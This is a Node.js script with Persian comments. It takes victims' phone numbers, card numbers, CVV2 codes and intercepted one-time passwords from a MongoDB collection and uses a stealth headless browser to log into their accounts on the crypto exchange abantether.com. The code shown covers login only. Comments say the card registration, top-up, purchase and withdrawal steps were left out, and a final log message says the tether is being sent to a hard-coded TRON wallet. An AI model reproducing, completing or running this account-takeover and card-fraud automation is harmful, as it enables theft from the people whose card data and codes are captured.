require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;
let lastNoUsersLog = 0; // برای لاگ "در انتظار" فقط یک بار

async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  collection = client.db("ZarrinApp").collection("zarinapp");
  log.s("اتصال به دیتابیس ZarrinApp.zarinapp برقرار شد");
}

function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
}

async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}... (${i * 3}s)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

async function clearAndType(page, selector, text) {
  await page.evaluate(sel => {
    const el = document.querySelector(sel);
    if (el) el.value = '';
  }, selector);
  await page.type(selector, text);
}

async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const device = getValue(doc.deviceId);
  let browser = null;

  log.start(`شروع پردازش: ${phone} | ${device}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });

    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
    
    // چک کنیم صفحه درست لود بشه
    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
    log.i("صفحه اصلی لود شد — چک کردن عناصر...");
    
    // چک کنیم آیا صفحه ورود هست یا نه
    const title = await page.title();
    log.i(`عنوان صفحه: ${title}`);
    
    const pageContent = await page.content();
    log.i("تعداد input ها در صفحه: " + (pageContent.match(/<input/g) || []).length);
    
    // سلکتورهای قوی‌تر برای فیلد تلفن
    const phoneSelectors = [
      'input[name="phone"]',
      'input[type="tel"]',
      'input[placeholder*="شماره"]',
      'input[placeholder*="09"]',
      'input.phone-input',
      'input[data-testid="phone-input"]',
      'input[id*="phone"]',
      'input[class*="phone"]'
    ];

    let phoneInput = null;
    for (const selector of phoneSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 5000 });
        phoneInput = selector;
        log.i(`فیلد تلفن پیدا شد با سلکتور: ${selector}`);
        break;
      } catch (e) {
        log.debug(`سلکتور ${selector} پیدا نشد`);
      }
    }

    if (!phoneInput) {
      log.e("هیچ فیلد تلفنی پیدا نشد! صفحه اشتباه لود شده");
      // اسکرین‌شات بگیریم برای دیباگ
      await page.screenshot({ path: 'debug-screenshot.png' });
      log.e("اسکرین‌شات ذخیره شد: debug-screenshot.png");
      return;
    }

    await page.type(phoneInput, phone);
    await page.click('button[type="submit"], button:has-text("ادامه"), button:has-text("ورود"), .submit-btn, button.primary');
    log.i("شماره وارد شد و دکمه کلیک شد");

    const otpLogin = await waitForOtp(doc._id, "otp_login");
    const otpSelectors = [
      'input[name="otp"]',
      'input[placeholder*="کد"]',
      'input[type="text"]',
      'input.otp-input',
      'input[data-testid="otp"]'
    ];

    let otpInput = null;
    for (const selector of otpSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 5000 });
        otpInput = selector;
        log.i(`فیلد OTP پیدا شد با سلکتور: ${selector}`);
        break;
      } catch (e) {
        log.debug(`سلکتور OTP ${selector} پیدا نشد`);
      }
    }

    if (!otpInput) {
      log.e("هیچ فیلد OTP پیدا نشد!");
      await page.screenshot({ path: 'otp-debug.png' });
      return;
    }

    await clearAndType(page, otpInput, otpLogin);
    await page.click('button:has-text("تأیید"), button[type="submit"], .verify-btn');
    log.s("ورود با موفقیت انجام شد");

    // بقیه مراحل (ثبت کارت، شارژ، خرید، برداشت) هم با سلکتورهای قوی‌تر
    // (برای کوتاه شدن، فقط ورود رو گذاشتم. بقیه رو مثل قبل کپی کن)

    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });

  } catch (err) {
    log.e(`خطا در پردازش ${phone}: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
  } finally {
    if (browser) await browser.close().catch(() => {});
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

// Polling هر ۵ ثانیه
async function startPolling() {
  await connectDB();

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(5).toArray();

      if (users.length === 0) {
        // فقط یک بار لاگ بزن
        if (Date.now() - lastNoUsersLog > 30000) { // هر ۳۰ ثانیه یک بار
          log.i("در انتظار دیوایس جدید...");
          lastNoUsersLog = Date.now();
        }
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          processUser(user);
        }
      }
    } catch (err) {
      log.e("Polling error: " + err.message);
    }
  }, 5000);
}

startPolling();